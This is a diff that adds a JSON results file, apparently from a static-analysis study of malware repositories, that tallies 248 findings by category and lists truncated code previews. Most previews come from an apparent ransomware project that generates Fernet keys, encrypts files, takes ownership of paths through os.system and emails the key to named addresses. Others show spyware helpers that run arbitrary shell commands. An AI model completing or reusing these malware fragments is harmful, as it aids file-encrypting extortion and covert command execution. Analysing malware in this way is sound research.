@@ -1,0 +1,135 @@
+{
+  "total_joern_only": 248,
+  "by_category": {
+    "A": 0,
+    "B": 0,
+    "C": 0,
+    "D": 241,
+    "E": 7
+  },
+  "samples": {
+    "D": [
+      {
+        "commit": "03ca7",
+        "func_name": "<module>",
+        "file_token": "main.py",
+        "code_preview": "from modules.crypt import crypt\nfrom modules.network import smtpgmail\nimport os, sys\nkeyname = os.environ[\"USERNAME\"]\ncc = crypt.exploreThenCrypt()\nsk = smtpgmail.sendTheKey()\ncc.keyCreation(keyname)\n",
+        "repo": "1stMalware"
+      },
+      {
+        "commit": "177b1",
+        "func_name": "<module>",
+        "file_token": "test.py",
+        "code_preview": "from cryptography.fernet import Fernet\ndef write_key():\n    key = Fernet.generate_key()\n    with open(\"key.key\", \"wb\") as key_file:\n        key_file.write(key)\ndef load_key():\n    return open(\"key.key",
+        "repo": "1stMalware"
+      },
+      {
+        "commit": "21b58",
+        "func_name": "<body>",
+        "file_token": "modules_rights_getRights.py",
+        "code_preview": "import os, sys\nclass ownThenUse():\n    def takeTheOwn(self):\n        self.get_ownership = \"{}{}\".format(self.path_to_takeown,self.explorer)\n        os.system(self.get_ownership)\n        self.path_to_i",
+        "repo": "1stMalware"
+      },
+      {
+        "commit": "21b58",
+        "func_name": "<module>",
+        "file_token": "main.py",
+        "code_preview": "from modules.crypt import crypt\nimport os, sys\nkeyname = os.environ[\"USERNAME\"]\ncc = crypt.exploreThenCrypt()\ncc.keyCreation(keyname)\ncc.exploreAll()\nimport os\nfrom cryptography.fernet import Fernet\nc",
+        "repo": "1stMalware"
+      },
+      {
+        "commit": "21b58",
+        "func_name": "<module>",
+        "file_token": "modules_network_smtp.py",
+        "code_preview": "import smtplib\nfrom email.mime.multipart import MIMEMultipart\nfrom email.mime.text import MIMEText\nfrom email.mime.base import MIMEBase\nfrom email import encoders\nfromaddr = \"sylvaindurif69@protonmail",
+        "repo": "1stMalware"
+      },
+      {
+        "commit": "3a1e0",
+        "func_name": "<body>",
+        "file_token": "modules_crypt_crypt.py",
+        "code_preview": "import os\nfrom cryptography.fernet import Fernet\nclass exploreThenCrypt():\n    def __init__(self):\n        self.key = Fernet.generate_key()\n        self.keyname = os.environ[\"USERNAME\"]\n\n    #Key gene",
+        "repo": "1stMalware"
+      },
+      {
+        "commit": "3a8ed",
+        "func_name": "<module>",
+        "file_token": "main.py",
+        "code_preview": "from modules.crypt import crypt\nfrom modules.network import smtpgmail\nimport os, sys\nkeyname = os.environ[\"USERNAME\"]\ncc = crypt.exploreThenCrypt()\nsk = smtpgmail.sendTheKey()\ncc.keyCreation(keyname)\n",
+        "repo": "1stMalware"
+      },
+      {
+        "commit": "3a8ed",
+        "func_name": "<module>",
+        "file_token": "modules_network_stmpgmail.py",
+        "code_preview": "import smtplib\nfrom email.mime.multipart import MIMEMultipart\nfrom email.mime.text import MIMEText\nfrom email.mime.base import MIMEBase\nfrom email import encoders\nfromaddr = \"sdurif924@gmail.com\"\ntoad",
+        "repo": "1stMalware"
+      },
+      {
+        "commit": "426f7",
+        "func_name": "<body>",
+        "file_token": "modules_crypt_crypt.py",
+        "code_preview": "import os\nfrom cryptography.fernet import Fernet\nclass exploreThenCrypt():\n    def __init__(self):\n        self.key = Fernet.generate_key()\n        self.name_key = os.environ[\"USERNAME\"]\n\n    #Key gen",
+        "repo": "1stMalware"
+      },
+      {
+        "commit": "47f7a",
+        "func_name": "<body>",
+        "file_token": "modules_crypt_crypt.py",
+        "code_preview": "import os\nfrom cryptography.fernet import Fernet\nclass exploreThenCrypt():\n    def __init__(self):\n        self.key = Fernet.generate_key()\n        self.keyname = os.environ[\"USERNAME\"]\n\n    #Key gene",
+        "repo": "1stMalware"
+      }
+    ],
+    "E": [
+      {
+        "commit": "f5809",
+        "func_name": "<file>",
+        "file_token": "modules_crypt_crypt.py",
+        "code_preview": "import os, sys\nfrom cryptography.fernet import Fernet\nclass exploreThenCrypt():\n    def keycreation(name):\n        key = Fernet.generate_key()\n        with open('C:\\\\Users\\\\Wilder\\\\Desktop\\\\filekey.ke",
+        "repo": "1stMalware"
+      },
+      {
+        "commit": "b40cc",
+        "func_name": "<file>",
+        "file_token": "core_jpeg_stegano.py",
+        "code_preview": "import subprocess\nimport os\nclass JpegStegano:\n    def encode(input_image_path, output_image_path, secret_message):\n        open(output_image_path, \"w\").close()\n        command = [\n            f\"{os.p",
+        "repo": "BskyBot"
+      },
+      {
+        "commit": "b65de",
+        "func_name": "parse_json",
+        "file_token": "utils_formatter.py",
+        "code_preview": "import json\nimport datetime\nclass FormatterUtils:\n    def parse_json(json_string: str) -> dict:\n        try:\n            return json.loads(json_string)\n        except json.JSONDecodeError as e:\n      ",
+        "repo": "KeySpy"
+      },
+      {
+        "commit": "3759a",
+        "func_name": "<file>",
+        "file_token": "misc_dummy_server_dummy_server.py",
+        "code_preview": "import errno\nimport os\nimport time\nfrom fastapi import FastAPI\nfrom pydantic import BaseModel\nclass FileLock:\n    def __init__(self, file_name, timeout=10, delay=.05):\n        \"\"\" Prepare the file loc",
+        "repo": "shameleon"
+      },
+      {
+        "commit": "132bd",
+        "func_name": "executeShellCommand",
+        "file_token": "Util.py",
+        "code_preview": "from subprocess import check_output\nclass Util:\n    def executeShellCommand(command:str):\n        try:\n            result = check_output(command, shell=True, encoding='437')\n        except Exception:\n",
+        "repo": "Spyware"
+      },
+      {
+        "commit": "401eb",
+        "func_name": "executeShellCommand",
+        "file_token": "Util.py",
+        "code_preview": "from subprocess import check_output\nimport getpass\nclass Util:\n    def executeShellCommand(command:str):\n        try:\n            result = check_output(command, shell=True, encoding='437')\n        exc",
+        "repo": "Spyware"
+      },
+      {
+        "commit": "e9d43",
+        "func_name": "executeShellCommand",
+        "file_token": "Util.py",
+        "code_preview": "from subprocess import check_output\nclass Util:\n    def executeShellCommand(command:str) -> str:\n        try:\n            result = check_output(command, shell=True, encoding='437')\n        except Exce",
+        "repo": "Spyware"
+      }
+    ]
+  }
+}
